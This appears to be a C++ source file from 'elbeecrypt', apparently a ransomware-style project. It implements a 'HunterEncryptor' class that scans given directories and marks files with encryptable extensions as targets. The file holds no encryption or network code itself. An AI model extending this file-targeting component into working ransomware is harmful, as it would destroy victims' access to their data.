#include <regex>
#include "elbeecrypt/common/targets/extensions.hpp"
#include "elbeecrypt/cryptor/hunter-encryptor.hpp"

namespace elbeecrypt::cryptor {
	//Include namespace definitions
	using namespace elbeecrypt::common;

	//Constructors & Destructor
	/** Impl of HunterEncryptor(path). */
	HunterEncryptor::HunterEncryptor(const std::vector<fs::path>& roots): Hunter(roots){
		//Scan the given directories for targets
		hunt(roots);
	}


	//Overrides
	/** Impl of isTargetable(path). */
	bool HunterEncryptor::isTargetable(const fs::path& path){
		return elbeecrypt::common::targets::Extensions::isEncryptable(path);
	}

	/** Impl of toString(). */
	std::string HunterEncryptor::toString(){
		//Very lazy lol
		std::string toStr = Hunter::toString();
		return std::regex_replace(toStr, std::regex("Hunter"), "HunterEncryptor");
	}
}